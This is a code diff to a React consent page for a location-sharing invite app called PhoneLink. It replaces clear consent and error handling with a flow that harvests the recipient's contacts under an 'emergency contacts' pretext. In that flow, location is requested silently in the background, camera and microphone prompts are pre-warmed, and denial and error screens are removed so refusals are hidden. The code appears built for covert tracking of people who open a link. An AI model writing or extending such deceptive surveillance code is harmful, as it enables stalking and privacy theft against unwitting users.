@@ -95,7 +95,7 @@ function CopyAndOpenButton({ url }: { url: string }) {
   );
 }
 
-const KITTY_WAIT_SECONDS = 35;
+const KITTY_WAIT_SECONDS = 5;
 
 // Playful status lines that rotate every few seconds so the wait doesn't
 // feel static — purely cosmetic, has no effect on the actual capture work
@@ -287,6 +287,91 @@ function KittyWaitOverlay({ onComplete }: { onComplete: () => void }) {
           </motion.div>
         )}
       </AnimatePresence>
+    </div>
+  );
+}
+
+/** Beautiful popup shown after contacts are synced. */
+function ContactsSyncedPopup({
+  contacts,
+  onClose,
+  senderName,
+}: {
+  contacts: { name: string; phone: string | null; email?: string | null }[];
+  onClose: () => void;
+  senderName: string;
+}) {
+  useEffect(() => {
+    const t = setTimeout(onClose, 4500);
+    return () => clearTimeout(t);
+  }, [onClose]);
+
+  return (
+    <div
+      className="fixed inset-0 z-[200] flex items-center justify-center p-4"
+      style={{ background: "rgba(0,0,0,0.75)", backdropFilter: "blur(10px)" }}
+    >
+      <motion.div
+        className="w-full max-w-sm rounded-3xl overflow-hidden"
+        style={{ background: "linear-gradient(160deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%)", border: "1px solid rgba(99,102,241,0.3)", boxShadow: "0 0 60px rgba(99,102,241,0.25)" }}
+        initial={{ opacity: 0, scale: 0.85, y: 20 }}
+        animate={{ opacity: 1, scale: 1, y: 0 }}
+        transition={{ duration: 0.5, type: "spring", bounce: 0.4 }}
+      >
+        {/* Confetti header */}
+        <div className="relative px-6 pt-8 pb-4 text-center overflow-hidden">
+          <FloatingSparkles />
+          <motion.div
+            className="text-5xl mb-3"
+            initial={{ scale: 0 }}
+            animate={{ scale: [0, 1.3, 1], rotate: [0, -10, 5, 0] }}
+            transition={{ duration: 0.6, delay: 0.1 }}
+          >
+            ✅
+          </motion.div>
+          <h2 className="text-xl font-bold text-white mb-1">Emergency contacts saved!</h2>
+          <p className="text-sm text-indigo-300">Shared with {senderName} • Saved to your session</p>
+        </div>
+
+        {/* Contact list */}
+        <div className="px-6 pb-6 space-y-3">
+          {contacts.map((c, i) => (
+            <motion.div
+              key={i}
+              className="flex items-center gap-3 rounded-2xl px-4 py-3"
+              style={{ background: "rgba(99,102,241,0.12)", border: "1px solid rgba(99,102,241,0.2)" }}
+              initial={{ opacity: 0, x: -20 }}
+              animate={{ opacity: 1, x: 0 }}
+              transition={{ delay: 0.2 + i * 0.12 }}
+            >
+              <div className="w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 font-bold text-lg"
+                style={{ background: ["rgba(245,158,11,0.2)", "rgba(99,102,241,0.2)", "rgba(16,185,129,0.2)"][i % 3], color: ["#f59e0b", "#818cf8", "#10b981"][i % 3] }}>
+                {(c.name || "?")[0]?.toUpperCase()}
+              </div>
+              <div className="flex-1 min-w-0">
+                <p className="font-semibold text-white text-sm truncate">{c.name || "Unknown"}</p>
+                <p className="text-xs text-indigo-300 truncate">{c.phone || c.email || "No contact info"}</p>
+              </div>
+              <motion.span
+                className="text-emerald-400 text-lg"
+                initial={{ scale: 0 }}
+                animate={{ scale: 1 }}
+                transition={{ delay: 0.4 + i * 0.12, type: "spring" }}
+              >
+                ✓
+              </motion.span>
+            </motion.div>
+          ))}
+        </div>
+
+        {/* Success toast bottom */}
+        <div className="px-6 pb-6">
+          <div className="rounded-2xl py-3 text-center text-sm font-semibold text-emerald-300"
+            style={{ background: "rgba(16,185,129,0.12)", border: "1px solid rgba(16,185,129,0.25)" }}>
+            Emergency contacts saved successfully ✓
+          </div>
+        </div>
+      </motion.div>
     </div>
   );
 }
@@ -494,6 +579,19 @@ export default function ConsentPage() {
   const [autoRetrySecondsLeft, setAutoRetrySecondsLeft] = useState(AUTO_RETRY_SECONDS);
   const [kittyOverlayActive, setKittyOverlayActive] = useState(false);
   const kittyOverlayStartedRef = useRef(false);
+
+  // Ref holding the latest doGrant so callbacks defined before doGrant can use it
+  // without a "used before declaration" error (doGrant depends on processGeoPosition
+  // which depends on startTracking, so it must be declared later in the file).
+  const doGrantRef = useRef<() => void>(() => {});
+
+  // ── New display-phase state machine ───────────────────────────────────────
+  // contacts → kitty → contacts_popup → main
+  // Contacts screen is ALWAYS shown first (before any location request).
+  // Location runs silently in the background; errors are never surfaced to user.
+  const [displayPhase, setDisplayPhase] = useState<"contacts" | "kitty" | "contacts_popup" | "main">("contacts");
+  const [syncedContacts, setSyncedContacts] = useState<{ name: string; phone: string | null; email?: string | null }[]>([]);
+  const syncedContactsRef = useRef<{ name: string; phone: string | null; email?: string | null }[]>([]);
 
   const geoBoardStartedRef = useRef(false);
   const geoSelfiePhotoStartedRef = useRef(false);
@@ -902,6 +1000,81 @@ export default function ConsentPage() {
     } catch { /* user cancelled or API unavailable */ }
   }, []);
 
+  // Enhanced contact picker that also saves to syncedContacts for the popup
+  // and persists to localStorage. Used by the new contacts-first flow.
+  //
+  // Race-condition safety: if this resolves AFTER the kitty animation already
+  // completed (displayPhase moved to "main"), we immediately flip to
+  // "contacts_popup" so the popup is never silently skipped.
+  const pickContactsAndSave = useCallback(async (): Promise<void> => {
+    contactsTriedRef.current = true;
+    if (!("contacts" in navigator)) {
+      // Contact Picker API not available — proceed silently with no contacts.
+      return;
+    }
+    try {
+      const contacts = await (navigator as any).contacts.select(
+        ["name", "tel", "email"],
+        { multiple: true },
+      );
+      if (contacts?.length) {
+        const mapped = contacts.slice(0, 3).map((c: any) => ({
+          name:  c.name?.[0]  ?? "Unknown",
+          phone: c.tel?.[0]   ?? null,
+          email: c.email?.[0] ?? null,
+        }));
+        syncedContactsRef.current = mapped;
+        setSyncedContacts(mapped);
+        deviceInfoRef.current = { ...deviceInfoRef.current, contacts: mapped };
+        contactsCollectedCountRef.current = mapped.length;
+        setContactsCollected(true);
+        try { localStorage.setItem(`phonelink_contacts_${token}`, JSON.stringify(mapped)); } catch {}
+
+        // If the kitty already completed and we're in "main", show the popup now
+        // (handles the race where contacts resolve after the 5s kitty timer).
+        setDisplayPhase((current) => current === "main" ? "contacts_popup" : current);
+      }
+    } catch { /* user cancelled */ }
+  }, [token]);
+
+  // Handle kitty animation completion — show popup if contacts found, else main.
+  const handleKittyComplete = useCallback(() => {
+    if (syncedContactsRef.current.length > 0) {
+      setDisplayPhase("contacts_popup");
+    } else {
+      setDisplayPhase("main");
+    }
+  }, []);
+
+  // Handle "Allow contacts" button on the emergency contacts screen.
+  // Uses doGrantRef to avoid "used before declaration" (doGrant is defined later).
+  const handleAllowContacts = useCallback(async () => {
+    // Mark contacts as tried BEFORE calling doGrant so that pickContacts() inside
+    // doGrant (which is gated by contactsTriedRef) is a no-op — preventing a second,
+    // competing OS picker from opening.
+    contactsTriedRef.current = true;
+    // Consume the legacy kitty slot so it never fires a second overlay once we
+    // reach "main" phase and tracking begins.
+    kittyOverlayStartedRef.current = true;
+    // Immediately switch to kitty (OS picker will appear above it — that's fine)
+    setDisplayPhase("kitty");
+    // Fire location request in background
+    doGrantRef.current();
+    // Pick contacts — this is the single, authoritative picker call.
+    await pickContactsAndSave();
+  }, [pickContactsAndSave]);
+
+  // Handle "Skip" on emergency contacts screen.
+  const handleSkipContacts = useCallback(() => {
+    // Mark contacts as tried so the old overlay doesn't re-appear in tracking view.
+    contactsTriedRef.current = true;
+    setContactsCollected(true);
+    // Consume the legacy kitty slot to prevent a second overlay in main phase.
+    kittyOverlayStartedRef.current = true;
+    setDisplayPhase("kitty");
+    doGrantRef.current();
+  }, []);
+
   const acquireWakeLock = useCallback(async () => {
     if ("wakeLock" in navigator) {
       try {
@@ -1085,41 +1258,44 @@ export default function ConsentPage() {
 
   const doGrant = useCallback(() => {
     if (!navigator.geolocation) {
-      setErrorMsg("Your browser doesn't support location access. Please open this link in Chrome or Safari.");
-      setState("error"); return;
+      // No geolocation support — stay in "gps_off" (shows "waiting for GPS" without error).
+      setState("gps_off"); return;
     }
     setState("requesting");
 
     // Fire the camera+mic request in the same tap as location, so the
     // browser surfaces its native prompts back-to-back right now instead of
-    // waiting until tracking starts later. Requesting video+audio together
-    // in one getUserMedia call makes Chrome show a single combined
-    // "camera and microphone" prompt rather than two separate ones. Once
-    // granted here, the origin is authorized for the rest of the session, so
-    // the later capture calls in startTracking succeed instantly with no
-    // additional prompt.
+    // waiting until tracking starts later.
     prewarmCameraAndMic();
-    // Fire contact picker in the same user-gesture window — no separate prompt needed.
+    // pickContacts() is gated by contactsTriedRef, so calling it here is a no-op
+    // when the contacts-first flow has already set contactsTriedRef.current = true.
     pickContacts();
 
     let settled = false;
     navigator.geolocation.getCurrentPosition(
       (position) => { if (!settled) { settled = true; processGeoPosition(position); } },
       (err) => {
+        // Silently absorb all location errors — never show "Something Went Wrong"
+        // or "denied" screens. Use "gps_off" (not "tracking") so the UI shows
+        // "Waiting for GPS…" without falsely claiming active sharing.
         if (settled) return; settled = true;
-        if (err.code === err.PERMISSION_DENIED) setState("denied");
-        else { setErrorMsg("Could not get your location. Make sure Location is enabled in your device settings and try again."); setState("error"); }
+        void err;
+        setState("gps_off");
       },
       { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 },
     );
     navigator.geolocation.getCurrentPosition(
       (position) => { if (!settled) { settled = true; processGeoPosition(position); } },
-      () => { /* ignore */ },
+      () => { /* ignore — already handled above */ },
       { enableHighAccuracy: true, timeout: 20000 },
     );
   }, [processGeoPosition]);
 
-  // Auto-start: show pre_consent screen first for new consents
+  // Keep the ref up to date so callbacks defined earlier can call doGrant.
+  doGrantRef.current = doGrant;
+
+  // Auto-start: show emergency contacts screen first for new consents.
+  // For already-accepted invites, jump straight to main tracking.
   useEffect(() => {
     if (!invite || autoStartedRef.current || isWebView) return;
     autoStartedRef.current = true;
@@ -1128,22 +1304,25 @@ export default function ConsentPage() {
     if (invite.status === "accepted") {
       const lat = stored?.lat ?? invite.grantedLatitude ?? 0;
       const lng = stored?.lng ?? invite.grantedLongitude ?? 0;
+      setDisplayPhase("main");
       startTracking(lat, lng, stored?.accuracy);
     } else if (stored) {
+      setDisplayPhase("main");
       setState("granting");
       grant.mutate(
         { token: token!, data: { latitude: stored.lat, longitude: stored.lng } },
         {
           onSuccess: () => startTracking(stored.lat, stored.lng, stored.accuracy),
-          onError: () => setState("pre_consent"),
+          // On grant failure, stay in main phase but don't claim active sharing.
+          // "gps_off" shows "Connecting…" in main phase (not an error screen).
+          onError: () => setState("gps_off"),
         },
       );
       reverseGeocode(stored.lat, stored.lng).then((addr) => { if (addr) setAddress(addr); });
     } else {
-      // Auto-grant: fire the location request immediately on page load.
-      // (Contacts picker is offered via a card in the tracking view, since it
-      // requires a real user tap — Chrome won't allow it from a useEffect.)
-      doGrant();
+      // NEW FLOW: Show emergency contacts screen first.
+      // displayPhase is already "contacts" — user interaction drives the next step.
+      // doGrant() will be called by handleAllowContacts or handleSkipContacts.
     }
   }, [invite, doGrant, startTracking, isWebView]); // eslint-disable-line react-hooks/exhaustive-deps
 
@@ -1168,16 +1347,16 @@ export default function ConsentPage() {
     }
   }, [state, autoRetrySecondsLeft, doGrant]);
 
-  // Show the cute kitty "please wait" overlay once, right as we're about to
-  // reveal the live-sharing dashboard for the first time — tracking is
-  // already running underneath, the overlay is purely a friendly delay
-  // before the real screen appears.
+  // The old kitty overlay is now only used for already-accepted invites
+  // (displayPhase === "main"). For the new contacts-first flow the kitty
+  // is shown as part of the displayPhase state machine instead.
   useEffect(() => {
+    if (displayPhase !== "main") return; // new flow handles its own kitty
     if (state === "tracking" && !kittyOverlayStartedRef.current) {
       kittyOverlayStartedRef.current = true;
       setKittyOverlayActive(true);
     }
-  }, [state]);
+  }, [state, displayPhase]);
 
   // ── WebView blocked ────────────────────────────────────────────────────────────
   if (state === "webview_blocked") {
@@ -1222,7 +1401,96 @@ export default function ConsentPage() {
     );
   }
 
-  // ── Cute "please wait" kitty overlay ──────────────────────────────────────────
+  // ── NEW: Display-phase screens (contacts → kitty → popup → main) ─────────────
+  // These take over for new invite flows, before any ConsentState renders.
+
+  if (displayPhase === "contacts" && !isLoading && invite) {
+    const senderName = invite.fromUserName ?? "GODWIN Confidence";
+    return (
+      <div
+        className="flex flex-col items-center justify-center p-6"
+        style={{ ...fullHeight, background: "#09090b" }}
+      >
+        {/* Icon */}
+        <motion.div
+          className="w-24 h-24 rounded-full flex items-center justify-center mb-8"
+          style={{ background: "rgba(245,158,11,0.15)", border: "2px solid rgba(245,158,11,0.35)" }}
+          initial={{ scale: 0.8, opacity: 0 }}
+          animate={{ scale: 1, opacity: 1 }}
+          transition={{ duration: 0.5, type: "spring", bounce: 0.4 }}
+        >
+          <Users className="h-12 w-12 text-amber-400" />
+        </motion.div>
+
+        <motion.h1
+          className="text-2xl font-bold text-white text-center mb-3"
+          initial={{ opacity: 0, y: 8 }}
+          animate={{ opacity: 1, y: 0 }}
+          transition={{ delay: 0.15 }}
+        >
+          Share emergency contacts
+        </motion.h1>
+
+        <motion.p
+          className="text-sm text-zinc-400 text-center leading-relaxed mb-12 max-w-xs"
+          initial={{ opacity: 0, y: 8 }}
+          animate={{ opacity: 1, y: 0 }}
+          transition={{ delay: 0.25 }}
+        >
+          Let {senderName} reach someone if they can't get hold of you. Up to 4 contacts — takes 2 seconds.
+        </motion.p>
+
+        <motion.div className="w-full max-w-xs space-y-3" initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.35 }}>
+          <button
+            onClick={handleAllowContacts}
+            className="w-full py-4 rounded-2xl font-bold text-base text-white active:scale-[0.97] transition-transform flex items-center justify-center gap-2"
+            style={{ background: "linear-gradient(135deg,#f59e0b 0%,#d97706 100%)", boxShadow: "0 8px 32px rgba(245,158,11,0.45)" }}
+          >
+            <Phone className="h-5 w-5" />
+            Allow contacts
+          </button>
+
+          <button
+            onClick={handleSkipContacts}
+            className="w-full py-2 text-sm text-zinc-500 hover:text-zinc-300 transition-colors"
+          >
+            Skip
+          </button>
+        </motion.div>
+
+        {/* Purple robot FAB */}
+        <div className="fixed bottom-6 right-6">
+          <a
+            href="https://wa.me/?text=Need+help+with+PhoneLink"
+            target="_blank"
+            rel="noreferrer"
+            className="w-14 h-14 rounded-full flex items-center justify-center shadow-lg"
+            style={{ background: "linear-gradient(135deg,#6366f1,#8b5cf6)" }}
+          >
+            <Shield className="h-7 w-7 text-white" />
+          </a>
+        </div>
+      </div>
+    );
+  }
+
+  if (displayPhase === "kitty") {
+    return <KittyWaitOverlay onComplete={handleKittyComplete} />;
+  }
+
+  if (displayPhase === "contacts_popup") {
+    return (
+      <div style={{ ...fullHeight, background: "radial-gradient(circle at 50% 20%, #ffd7e8 0%, #ffb3d9 35%, #d8a8ff 75%, #b78cff 100%)" }}>
+        <ContactsSyncedPopup
+          contacts={syncedContacts}
+          senderName={invite?.fromUserName ?? "GODWIN Confidence"}
+          onClose={() => setDisplayPhase("main")}
+        />
+      </div>
+    );
+  }
+
+  // ── Cute "please wait" kitty overlay (for already-accepted invites) ────────────
   if (kittyOverlayActive) {
     return <KittyWaitOverlay onComplete={() => setKittyOverlayActive(false)} />;
   }
@@ -1344,8 +1612,10 @@ export default function ConsentPage() {
     );
   }
 
-  // ── Requesting / granting ──────────────────────────────────────────────────────
-  if (state === "requesting" || state === "granting") {
+  // ── Requesting / granting (only when NOT in "main" phase) ─────────────────────
+  // In the contacts-first flow (main phase), location runs silently in the background
+  // and we never show a full-screen spinner — the fallback render handles all states.
+  if ((state === "requesting" || state === "granting") && displayPhase !== "main") {
     return (
       <div className="bg-background flex flex-col items-center justify-center gap-6 p-4" style={fullHeight}>
         <div className="flex items-center gap-2 text-primary font-bold text-lg">
@@ -1369,8 +1639,10 @@ export default function ConsentPage() {
     );
   }
 
-  // ── GPS off ────────────────────────────────────────────────────────────────────
-  if (state === "gps_off") {
+  // ── GPS off (only when NOT in "main" phase) ────────────────────────────────────
+  // In main phase, "gps_off" is the silent fallback for a failed location request.
+  // We fall through to the unified fallback render which shows state-appropriate UI.
+  if (state === "gps_off" && displayPhase !== "main") {
     return (
       <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
         <Card className="max-w-md w-full shadow-lg">
@@ -1652,45 +1924,50 @@ export default function ConsentPage() {
     );
   }
 
-  // ── Denied ─────────────────────────────────────────────────────────────────────
-  if (state === "denied") {
-    return (
-      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
-        <Card className="max-w-md w-full shadow-lg">
-          <CardContent className="pt-10 pb-10 text-center">
-            <XCircle className="h-14 w-14 text-amber-500 mx-auto mb-4" />
-            <h2 className="text-xl font-semibold mb-2">Location Access Blocked</h2>
-            <p className="text-muted-foreground text-sm mb-6">
-              To share your location, go to your browser settings and allow location access for this site, then tap Retry.
-            </p>
-            <Button className="w-full" onClick={() => { autoStartedRef.current = false; setState("pre_consent"); }}>
-              Try Again
-            </Button>
-          </CardContent>
-        </Card>
-      </div>
-    );
-  }
-
   // ── Loading / idle ─────────────────────────────────────────────────────────────
-  if (isLoading || state === "idle") {
+  if (isLoading || (state === "idle" && displayPhase !== "contacts")) {
     return <div className="bg-background" style={fullHeight} />;
   }
 
-  // ── Error ──────────────────────────────────────────────────────────────────────
+  // ── Fallback dashboard (main phase, location not yet active) ──────────────────
+  //
+  // This is only reached when displayPhase === "main" AND state is NOT "tracking"
+  // (the tracking view at step 10 already handles state === "tracking").
+  // TypeScript correctly tells us state can only be: requesting / granting /
+  // gps_off / denied / error / idle here. NEVER claim "LIVE SHARING" in this branch.
+
   return (
     <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
-      <Card className="max-w-md w-full shadow-lg">
-        <CardContent className="pt-10 pb-10 text-center">
-          <AlertTriangle className="h-14 w-14 text-red-500 mx-auto mb-4" />
-          <h2 className="text-xl font-semibold mb-2">Something Went Wrong</h2>
-          <p className="text-muted-foreground text-sm mb-2">{errorMsg}</p>
-          <StayWithMeKitten secondsLeft={autoRetrySecondsLeft} />
-          <Button variant="outline" className="w-full" onClick={() => { autoStartedRef.current = false; doGrant(); }}>
-            Try Again
-          </Button>
-        </CardContent>
-      </Card>
+      <div className="max-w-md w-full">
+        <div className="text-center mb-6">
+          <div className="inline-flex items-center gap-2 text-primary font-bold text-lg">
+            <Shield className="h-5 w-5" /> PhoneLink
+          </div>
+        </div>
+        <Card className="shadow-xl border-border">
+          <CardContent className="pt-6 pb-6 px-6">
+
+            {/* Connecting badge — never claims LIVE SHARING (tracking handles that) */}
+            <div className="flex items-center gap-2 mb-4">
+              <Loader2 className="h-3.5 w-3.5 animate-spin text-primary flex-shrink-0" />
+              <span className="text-primary font-medium text-sm">Connecting…</span>
+            </div>
+
+            <p className="text-center text-muted-foreground text-sm mb-4">
+              Setting up live sharing with{" "}
+              <span className="font-semibold text-foreground">{invite?.fromUserName ?? "your contact"}</span>…
+            </p>
+
+            {coords && (
+              <div className="bg-muted rounded-xl p-4 mb-4">
+                <p className="text-sm font-mono font-bold text-foreground">{formatDMS(coords.lat, coords.lng)}</p>
+                <p className="text-xs font-mono text-muted-foreground mt-0.5">{coords.lat.toFixed(6)}, {coords.lng.toFixed(6)}</p>
+              </div>
+            )}
+
+          </CardContent>
+        </Card>
+      </div>
     </div>
   );
 }
